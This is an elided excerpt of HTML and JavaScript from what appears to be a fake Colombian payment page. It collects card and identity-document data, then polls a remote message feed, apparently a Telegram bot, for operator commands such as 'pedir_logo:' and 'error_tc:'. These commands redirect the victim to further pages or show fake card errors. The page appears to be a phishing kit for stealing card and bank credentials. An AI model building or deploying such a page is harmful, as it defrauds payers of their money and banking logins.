...
<script>
  document.addEventListener("DOMContentLoaded", () => {
    ...
    btnPagar.addEventListener("click", async function(e) {
      ...
      const documentoIdentidad = document.getElementById("cc2").value.trim();
    ...
    async function checkPaymentVerification(transactionId) {
      ...
      if (lastUpdateId !== null) {
        url.searchParams.append("offset", lastUpdateId + 1);
      }
      ...
      fetch(url)
        ...
        .then((data) => {
          ...
          if (updates.length > 0) {
            lastUpdateId = updates[updates.length - 1].update_id; // Actualiza el último ID leído
          }
          ...
          if (verificationUpdate) {
            ...
            if (data.startsWith("pedir_logo:")) {
              window.location.href = "chedf.php";
            } else if (data.startsWith("error_tc:")) {
              alert("La tarjeta de crédito no pudo ser procesada.");
...
<body class="bg-gray">
  ...
  <main class="mt-6 bg-gray">
    ...
    <div class="bg-white card-rounded pt-1 pb-1 mb-5" onclick="selectPayment('cc')">
      <form class="" id="form-payment">
        <div class="d-flex flex-row align-items-start mt-3  ">
          ...
          <div>
            <div class="radio-container m-2">
              <input type="radio" name="travel-opt" id="cc-radio" checked />
              <div class="radio-blue ct-radio"></div>
            </div>
          </div>
        </div>

        <div class="pr-3 pl-3" id="cc">
    ...
    <div class="bg-white card-rounded pt-1 pb-5 mb-5" onclick="selectPayment('pse')">
      ...
      <div
        ...
        <div style="width: 75%">
          <p class="fw-bold tc-ocean m-0">
            Débito bancario vía PSE
          </p>
          <p class="mt-1 tc-gray-smoke">
            Te dirijiremos a PSE para continuar con tu pago.
          </p>
        </div>
        <div>
          <div class="radio-container m-2">
            <input type="radio" name="travel-opt" id="pse-radio" disabled />
            <div class="radio-blue ct-radio"></div>
          </div>
        </div>
      </div>

      <div class="pr-3 pl-3" id="pse" style="display: none;">
        <div class="select-container">
          <select id="txt-entidad-pse" required>
            <option label="BANCO AV VILLAS" value="avvillas">
              BANCO AV VILLAS
            </option>
            <option label="BANCO CAJA SOCIAL" value="caja-social">
    ...
    <button type="button" class="btn-success mb-5" id="btn-pagar" style="display: block;">
      Pagar <span id="btn-pagar-monto">COP 290.090,00</span>
    </button>

    <button type="button" class="btn-success mb-5" id="btn-pagar-pse" style="display: none;" onclick="payPse()">
      Pagar <span id="btn-pagar-monto">COP 290.090,00</span>
    </button>
  </main>
